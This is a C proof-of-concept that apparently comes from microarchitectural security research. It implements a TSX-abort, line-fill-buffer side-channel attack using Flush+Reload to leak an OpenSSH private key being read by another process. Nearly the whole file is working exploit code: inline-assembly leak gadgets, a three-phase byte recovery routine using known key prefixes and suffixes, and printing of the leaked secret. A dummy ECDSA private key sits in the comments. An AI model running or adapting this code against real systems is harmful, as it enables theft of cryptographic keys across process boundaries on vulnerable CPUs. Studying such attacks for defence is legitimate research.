// Running ssh-agent add seems to load the key much too slowly,
// but by running cat dummy-key in a loop, we can leak the key for now.

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/mman.h>
#include <string.h>
#include <immintrin.h>

#include "util-ssh.h"

#define CONFIDENCE_SCORE 1

#define CACHELINESIZE 64
#define SECRET_LEN  2 * CACHELINESIZE

#define PAGESIZE 4096

// rounds before restarting to leak from the end
//#define PHASE2_MAX_ROUNDS 95000000
#define PHASE2_MAX_ROUNDS 10000
// bytes to be leaked before starting in faster, more error prone phase 3
#define PHASE2_MIN_LEAKED_BYTES 0


#define DEFAULT_URL "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5v"
//#define DEFAULT_URL "-----BEGIN OPENSSH PRIVATE KEY-----\n"

//#define DEFAULT_URL_END "=\n-----END OPENSSH PRIVATE KEY-----"
//#define DEFAULT_URL_END "D OPENSSH PRIVATE KEY-----"

// dummy_ecdsa split into 64 byte cache lines:
//"-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5v"
//"bmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS\n1zaGEyLW5pc3RwMjU2AAA"
//"AQQTJnSC5Hf5dZeUVJ7tRQ3XdaeNEEWqg\nvOcik13af1gQ2zTSl75TwpteygJj8k"
//"xtKDkptOhL8noNiztvRIWwE5f9AAAAoJosWrKaLF\nqyAAAAE2VjZHNhLXNoYTItb"
//"mlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMmdILkd/l1l5RUn\nu1FDdd1p40QRaqC8"
//"5yKTXdp/WBDbNNKXvlPCm17KAmPyTG0oOSm06Evyeg2LO29EhbATl/\n0AAAAgNAP"
//"UPqtfLjkHsRTj69s3NuySrrt+/B4wV0nm3qPNKk4AAAAHYWxAY2FrZQE=\n-----E"
//"ND OPENSSH PRIVATE KEY-----"

// Using the following as endings work fine to leak the second cache line:
//#define DEFAULT_URL_END "GEyLW5pc3RwMjU2AAA"
#define DEFAULT_URL_END "MjU2AAA"

// The following endings do not work for leaking another cache line:
//#define DEFAULT_URL_END "\n0AAAAgNAP"
//#define DEFAULT_URL_END "eygJj8k"
//#define DEFAULT_URL_END "ZQE=\n-----E"

unsigned char __attribute__((aligned(PAGESIZE))) *buf;
unsigned char __attribute__((aligned(PAGESIZE))) *buf2;
unsigned char __attribute__((aligned(PAGESIZE))) *leak_mapping;
unsigned char hist[SECRET_LEN][BUF_SIZE];

//unsigned char secret[SECRET_LEN+1] = "________________________________________________________________________________________________________________________________";
unsigned char secret[SECRET_LEN+1];

/*
 * Leak 2 bytes with 6-byte mask. Used in phase 1.
 */
static inline __attribute__((always_inline)) void tsxabort_leak_clflush(
      unsigned char *leak, unsigned char *flushbuffer,
      register uintptr_t index, register uintptr_t mask,
      unsigned char *reloadbuffer1, unsigned char *reloadbuffer2) {
    asm volatile(
    "movq $0x00ffffffffffffff, %%r11\n" // put 7 byte mask in r11
    "clflush (%0)\n"
    "sfence\n"
    "clflush (%1)\n"

    "xbegin 1f\n"
    "vsqrtps %%xmm0, %%xmm0\n"      // Compute the square root of an fp integer.
    "vsqrtps %%xmm0, %%xmm0\n"      // Unsure why this is necessary.
    "vsqrtps %%xmm0, %%xmm0\n"      // Current best guess is that this reserves LFB entries.
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"

    // Leak from LFB
    "movq (%0), %%rax\n"            // leak 8 byte (little endian) starting from 'index' into %%rax
    "xorq  %2, %%rax\n"             // xor with 6 byte mask: if hit then last 6 bytes == 0x0
    "movq %%rax, %%r12\n"           // copy to leak 2nd byte from r12 later

    "andq %%r11, %%rax\n"           // zero out first byte
    "rol $0x10, %%rax\n"            // shift and rotate: 0x0045000000000003->0x0000000000030045, 
                                    //                   0x0045000000000000->0x0000000000000045
    "shl $0xc, %%rax\n"             // calculate cache index: %%rax * 4096 (2**0xc)
    "movq (%%rax, %3), %%rax\n"     // copy from [%%rax+%3] -> touch value in reloadbuffer1

    // Leak 2nd byte in separate buffer
    "rol $0x10, %%r12\n"            // shift and rotate: 0x1145000000000003->0x00000000031145, 
                                    //                   0x1145000000000000->0x00000000001145
    "shr $0x8, %%r12\n"             // cut off last byte (already leaked in first buffer)
                                    //                   0x0000000000031145->0x00000000000311
                                    //                   0x0000000000001145->0x00000000000011
    "shl $0xc, %%r12\n"             // calculate cache index: %%r12 * 4096 (2**0xc)
    "movq (%%r12, %4), %%r12\n"     // copy from [%%r12+%4] -> touch value in reloadbuffer2

    // touch DUMMY_HIT (0x40 * 4096 = 0x23000) to fail fast from F+R
    "movq 0x40000(%3), %%rax\n"
    "movq 0x40000(%3), %%rax\n"
    "movq 0x40000(%3), %%rax\n"
    "movq 0x40000(%3), %%rax\n"

    "xend\n"
    "1:\n"
    :
    :"r" (leak+index), "r" (flushbuffer), "r" (mask), "r" (reloadbuffer1), "r" (reloadbuffer2)
    :"rax", "r11", "r12"
	);
    mfence();
}

/*
 * Leak reverse 1 byte with 7-byte mask. Used in phase 2.
 */
static inline __attribute__((always_inline)) void tsxabort_leak_clflush_reverse_single(
    unsigned char *leak, unsigned char *flushbuffer,
    register uintptr_t index, register uintptr_t mask,
    unsigned char *reloadbuffer1, unsigned char *reloadbuffer2) {
    asm volatile(
    "clflush (%0)\n"
    "sfence\n"
    "clflush (%1)\n"

    "xbegin 1f\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"

    // Leak from LFB
    "movq (%0), %%rax\n"            // leak 8 byte (little endian) starting from 'index' into %%rax
    "xorq  %2, %%rax\n"             // xor with 8 byte mask: if hit then first 7 bytes == 0x0
    "shl $0xc, %%rax\n"             // %%rax * 4096 (2**12)
    "movq (%%rax, %3), %%rax\n"     // copy from [%%rax+%3] -> touch value in reloadbuffer1

    // touch DUMMY_HIT (0x40 << 0xc) to fail fast from F+R
    "movq 0x40000(%3), %%rax\n"
    "movq 0x40000(%3), %%rax\n"
    "movq 0x40000(%3), %%rax\n"
    "movq 0x40000(%3), %%rax\n"

    "xend\n"
    "1:\n"
    :
    :"r"(leak+index), "r"(flushbuffer), "r"(mask), "r"(reloadbuffer1), "r"(reloadbuffer2)
    :"rax", "r11", "r12"
    );
    mfence();
}

/*
 * Leak reverse 2 bytes with 6-byte mask. Used in phase 3.
 */
static inline __attribute__((always_inline)) void tsxabort_leak_clflush_reverse(
    unsigned char *leak, unsigned char *flushbuffer,
    register uintptr_t index, register uintptr_t mask,
    unsigned char *reloadbuffer1, unsigned char *reloadbuffer2) {
    asm volatile(
    "movq $0xffffffffffff00ff, %%r11\n"
    "clflush (%0)\n"
    "sfence\n"
    "clflush (%1)\n"

    "xbegin 1f\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"
    "vsqrtps %%xmm0, %%xmm0\n"

    // Leak from LFB
    "movq (%0), %%rax\n"            // leak 8 byte (little endian) starting from 'index' into %%rax
    "xorq  %2, %%rax\n"             // xor with 8 byte mask: if hit then first 6 bytes == 0x0
    "movq %%rax, %%r12\n"           // copy to leak 2nd byte
    "shr $0x8, %%rax\n"             // cut off last byte: 0x3000000000001145->0x30000000000011, successful:0x0000000000001145->0x00000000000011
    "shl $0xc, %%rax\n"             // %%rax * 4096 (2**12)
    "movq (%%rax, %3), %%rax\n"     // copy from [%%rax+%3] -> touch value in reloadbuffer1

    // Leak 2nd byte in separate buffer
    "andq %%r11, %%r12\n"            // cut off second last byte (already leaked in first buffer)
    "shl $0xc, %%r12\n"             // %%r12 * 4096 (2**12)
    "movq (%%r12, %4), %%r12\n"     // copy from [%%r12+%4] -> touch value in reloadbuffer2

    // touch DUMMY_HIT (0x40 << 0xc) to fail fast from F+R
    "movq 0x40000(%3), %%rax\n"
    "movq 0x40000(%3), %%rax\n"
    "movq 0x40000(%3), %%rax\n"
    "movq 0x40000(%3), %%rax\n"

    "xend\n"
    "1:\n"
    :
    :"r"(leak+index), "r"(flushbuffer), "r"(mask), "r"(reloadbuffer1), "r"(reloadbuffer2)
    :"rax", "r11", "r12"
    );
    mfence();
}


int main(int argc, char* argv[]) {
    // init 'secret' with underscores
    memset(secret, '_', SECRET_LEN);
    secret[SECRET_LEN] = '\0';

    buf = (unsigned char *)mmap(0, BUF_TOTAL, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
    memset(buf, 1, BUF_TOTAL);

    buf2 = (unsigned char *)mmap(0, BUF_TOTAL, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE | MAP_HUGETLB, -1, 0);
    memset(buf2, 1, BUF_TOTAL);

    leak_mapping = (unsigned char *)mmap(0, PAGESIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    memset(leak_mapping, 1, PAGESIZE);

    CACHE_MISS_THRESHOLD = detect_flush_reload_threshold(buf);
    printf("F+R threshold: %d\n", CACHE_MISS_THRESHOLD);

    flush_buffer(buf);
    flush_buffer(buf2);

    // prepare secret
    memcpy(secret, DEFAULT_URL, strlen(DEFAULT_URL));

    register uint64_t mask;
    register int index;
    int update, update2;
    int found_index;

    printf("\n############################################################\n");
    printf("Phase 1: Leak first cache line\n");
    printf("Secret: %s\n", secret);
    printf("############################################################\n");

    found_index = strlen(DEFAULT_URL);

    while(found_index < CACHELINESIZE) {
        index = found_index - 6;
        // use the last 6 bytes to compare and filter out noise
        mask = *((uint64_t *)&secret[index]) & 0x0000ffffffffffff;
        update = 0;
        update2 = 0;

        while(1) {
            // leak value into buffers
            tsxabort_leak_clflush(leak_mapping, buf2, index, mask, buf, buf2);

            // F+R -> mark found value in histogram
            //for(int i=DUMMY_HIT; i<=TO; i++) {
            for(int i=0xa; i<=TO; i++) {
                // valid_chars = a, d, 20, 2b, 2d, 2f-39, 3d, 41-5a, 61-7a
                // 0x40 is DUMMY_HIT, best to include
                if (
                (0x0a < i && i < 0x0d) ||
                (0x0d < i && i < 0x20) ||
                (0x20 < i && i < 0x2b) ||
                (0x2b < i && i < 0x2d) ||
                (0x2d < i && i < 0x2f) ||
                (0x39 < i && i < 0x3d) ||
                (0x3d < i && i < 0x40) ||
                (0x5a < i && i < 0x61)
                // The character mappings of the codes that we accept are:
                //   0x0a → '\n'
                //   0x0d → '\r'
                //   0x20 → ' '
                //   0x2b → '+'
                //   0x2d → '-'
                //   0x2f → '/'
                //   …
                //   0x39 → '9'
                //   0x3d → '='
                //   0x40 → '@' (this one is the DUMMY_HIT)
                //   …
                //   0x5a → 'Z'
                //   0x61 → 'a'
                //   …
                //   0x7a → 'z' (this is the final TO value)
                ) {
                    continue;
                }

                int time = time_flush_reload(buf + STRIDE * i);

                if(time < CACHE_MISS_THRESHOLD) {
                    hist[index][i]++;
                    if(i != DUMMY_HIT) {
                        printf("Buf 1: 0x%x=%c\n", i, i);
                        update = i;

                        // check for 2nd byte
                        for(int k=FROM; k<=TO; k++) {
                            time = time_flush_reload(buf2 + STRIDE * k);
                            if(time < CACHE_MISS_THRESHOLD) {
                                hist[index+1][k]++;
                                printf("Buf 2: 0x%x=%c\n", k, k);
                                update2 = k;
                            }
                        }
                    }
                    break;
                }
            }

            // check if F+R yields satisfying result > CONFIDENCE_SCORE
            if (update) {
                // filter out invalid chars -> more reliable
                if(!valid_char(update)) {
                    //printf("Invalid char: %c\n", update);
                    update = 0;
                    update2 = 0;
                    continue;
                }
                if(update2) {
                    if(!valid_char(update2)) {
                        //printf("Invalid char: %c\n", update2);
                        update = 0;
                        update2 = 0;
                        continue;
                    }
                }


                if(found_index < (CACHELINESIZE - 2) && hist[index][update] >= CONFIDENCE_SCORE) {
                    printf("Found: 0x%x=%c, index: %d\n", update, update, found_index);
                    secret[found_index] = update;
                    found_index++;

                    if(found_index < (CACHELINESIZE - 2) && update2 && hist[index+1][update2] >= CONFIDENCE_SCORE) {
                        printf("Found: 0x%x=%c, index: %d\n", update2, update2, found_index);
                        secret[found_index] = update2;
                        found_index++;
                    }

                    printf("%s\n", secret);
                    break;

                // last byte is a special case, wait until both are matching confidence score
                } else if(found_index == (CACHELINESIZE - 2)
                && hist[index][update] >= CONFIDENCE_SCORE
                && hist[index+1][update2] >= CONFIDENCE_SCORE) {
                    printf("Found: 0x%x=%c, index: %d\n", update, update, found_index);
                    secret[found_index] = update;
                    found_index++;
                    printf("Found: 0x%x=%c, index: %d\n", update2, update2, found_index);
                    secret[found_index] = update2;
                    found_index++;
                    break;
                }
            }
        }
    }

    printf("Phase 1 complete! Current secret: %s\n", secret);
    //exit(-1);

    printf("\n############################################################\n");
    printf("Phase 2: Determine index and first %d bytes of string to leak reverse\n", PHASE2_MIN_LEAKED_BYTES);
    printf("Secret: %s\n", secret);
    int offset = SECRET_LEN;
    memcpy(secret + offset - strlen(DEFAULT_URL_END), DEFAULT_URL_END, strlen(DEFAULT_URL_END));
    secret[offset] = '\0';
    printf("Secret: %s\nOffset: %d\n", secret, offset);
    printf("############################################################\n");

    int leaked_bytes_reverse = 0;
    int rounds = 0;
    invalid_leaks_count = 0;
    found_index = offset;

    while(1) {
	index = found_index - strlen(DEFAULT_URL_END) - 1;
	printf("round: %d, index: %d, modulo %d index: %d.\n", rounds, index, CACHELINESIZE, index % CACHELINESIZE);
	
        mask = *((uint64_t *)&secret[index]) & 0xffffffffffffff00; // excluding last chr
        update = 0;
        rounds = 0;

        while(1) {
            // leak value into buffers
            //tsxabort_leak_clflush_reverse_single(leak_mapping, buf2, index % CACHELINESIZE, mask, buf, buf2);
            tsxabort_leak_clflush_reverse_single(leak_mapping, buf2, index, mask, buf, buf2);

            // F+R -> mark found value in histogram
            for(int i=0xa; i<=TO; i++) {
                // valid_chars = a, d, 20, 2b, 2d, 2f-39, 3d, 41-5a, 61-7a
		// 0x40 is DUMMY_HIT, best to include
                if (            (i > 0x0a && i < 0x0d) ||
				(i > 0x0d && i < 0x20) ||
				(i > 0x20 && i < 0x2b) ||
				(i > 0x2b && i < 0x2d) ||
				(i > 0x2d && i < 0x2f) ||
				(i > 0x39 && i < 0x3d) ||
				(i > 0x3d && i < 0x40) ||
				(i > 0x5a && i < 0x61) 
		   ) {
			continue;
		}

                int time = time_flush_reload(buf + STRIDE * i);

                if(time < CACHE_MISS_THRESHOLD) {
                    hist[index][i]++;
                    if(i != DUMMY_HIT) {
                        printf("Buf 1: 0x%x=%c\n", i, i);
                        update = i;
                    }
                    break;
                }
            }

            // check if F+R yields satisfying result > CONFIDENCE_SCORE
            if (update) {
                // filter out invalid chars -> more reliable
                if(!valid_char(update)) {
                    printf("Invalid char: %c\n", update);
                    update = 0;
                    continue;
                }

                if(hist[index][update] >= CONFIDENCE_SCORE) {
                    printf("Found: 0x%x=%c, index: %d\n", update, update, index);
                    secret[index] = update;
                    found_index--;
                    leaked_bytes_reverse++;

                    printf("%s\n", secret);
                    break;
                }
            }

            // check if it gets stuck and restart
            // getting stuck is caused by misaligned data but won't be our target row!
            if(++rounds >= PHASE2_MAX_ROUNDS) {
                printf("Rounds larger or equal to max rounds: %d, %d\n", rounds, PHASE2_MAX_ROUNDS);
                // remember invalid leaks so we don't always have to wait PHASE2_MAX_ROUNDS
		// -> this does not actually hold for this system
                if(leaked_bytes_reverse == 2) {
                    printf("There are two leaked bytes\n");
                    //add_invalid_leak(secret[index+1], secret[index+2]);
                }
                printf("1. Reset to reverse leak starting from: %s\n", DEFAULT_URL_END);
                //secret[index+1] = '_';
                if(leaked_bytes_reverse > 0) secret[index+1] = '_';
                if(leaked_bytes_reverse > 1) secret[index+2] = '_';
                leaked_bytes_reverse = 0;
                found_index = offset;
                break;
            }
        }

        // check for invalid leaked bytes
        if(!invalid_reverse_leak(secret, index, leaked_bytes_reverse)) {
            printf("2. Reset to reverse leak starting from: %s\n", DEFAULT_URL_END);
            secret[index] = '_';
            secret[index+1] = '_';
            leaked_bytes_reverse = 0;
            found_index = offset;
            continue;
        }
        if(leaked_bytes_reverse == PHASE2_MIN_LEAKED_BYTES) {
            break;
        }
    }

    printf("\n############################################################\n");
    printf("Phase 3: Leak 2nd cache line reverse\n");
    printf("Secret: %s\n", secret);
    printf("############################################################\n");

    //found_index--; // we're leaking the first byte with an offset of -1

    while(index >= CACHELINESIZE) {
	index = found_index - strlen(DEFAULT_URL_END) - 1;
	printf("index: %d, modulo %d index: %d.\n", index, CACHELINESIZE, index % CACHELINESIZE);

        mask = *((uint64_t *)&secret[index]) & 0xffffffffffff0000;
        update = 0;
        update2 = 0;

        while(1) {
            // leak value into buffers
            //tsxabort_leak_clflush_reverse(leak_mapping, buf2, index % CACHELINESIZE, mask, buf, buf2);
            tsxabort_leak_clflush_reverse(leak_mapping, buf2, index, mask, buf, buf2);

            // F+R -> mark found value in histogram
            for(int i=0xa; i<=TO; i++) {
                // valid_chars = a, d, 20, 2b, 2d, 2f-39, 3d, 41-5a, 61-7a
		// 0x40 is DUMMY_HIT, best to include
                if (            (i > 0x0a && i < 0x0d) ||
				(i > 0x0d && i < 0x20) ||
				(i > 0x20 && i < 0x2b) ||
				(i > 0x2b && i < 0x2d) ||
				(i > 0x2d && i < 0x2f) ||
				(i > 0x39 && i < 0x3d) ||
				(i > 0x3d && i < 0x40) ||
				(i > 0x5a && i < 0x61) 
		   ) {
			continue;
		}

                int time = time_flush_reload(buf + STRIDE * i);

                if(time < CACHE_MISS_THRESHOLD) {
                    hist[index+1][i]++;
                    if(i != DUMMY_HIT) {
                        printf("Buf 1: 0x%x=%c\n", i, i);

                        update = i;

                        // check for 2nd byte
                        for(int k=FROM; k<=TO; k++) {
                            time = time_flush_reload(buf2 + STRIDE * k);
                            if(time < CACHE_MISS_THRESHOLD) {
                                hist[index][k]++;
                                printf("Buf 2: 0x%x=%c\n", k, k);
                                update2 = k;
                            }
                        }
                    }
                    break;
                }
            }

            // check if F+R yields satisfying result > CONFIDENCE_SCORE
            if (update) {
                // filter out invalid chars -> more reliable
                if(!valid_char(update)) {
                    printf("Invalid char: %c\n", update);
                    update = 0;
                    update2 = 0;
                    continue;
                }
                if(update2) {
                    if(!valid_char(update2)) {
                        printf("Invalid char: %c\n", update2);
                        update = 0;
                        update2 = 0;
                        continue;
                    }
                }

                if(index > 64 && hist[index+1][update] >= CONFIDENCE_SCORE) {
                    printf("Found: 0x%x=%c, index: %d\n", update, update, index+1);
                    secret[index+1] = update;
                    found_index--;

                    if(index > 65 && update2 && hist[index][update2] >= CONFIDENCE_SCORE) {
                        printf("Found: 0x%x=%c, index: %d\n", update2, update2, index);
                        secret[index] = update2;
                        found_index--;
                    }

                    printf("%s\n", secret);
                    break;

                // last byte is a special case, wait until both are matching confidence score
                } else if(index == 64
                && hist[index+1][update] >= CONFIDENCE_SCORE
                && hist[index][update2] >= CONFIDENCE_SCORE) {
                    printf("Found: 0x%x=%c, index: %d\n", update, update, index+1);
                    secret[index+1] = update;
                    found_index--;
                    printf("Found: 0x%x=%c, index: %d\n", update2, update2, index);
                    secret[index] = update2;
                    found_index--;

                    // set index so that we break out of outer loop
                    index = found_index - 8;
                    break;
                }
            }
        }
    }

    printf("\n\n############################################################\n\n");
    printf("Leaked secret: \n%s\n", secret);

    return 0;
}
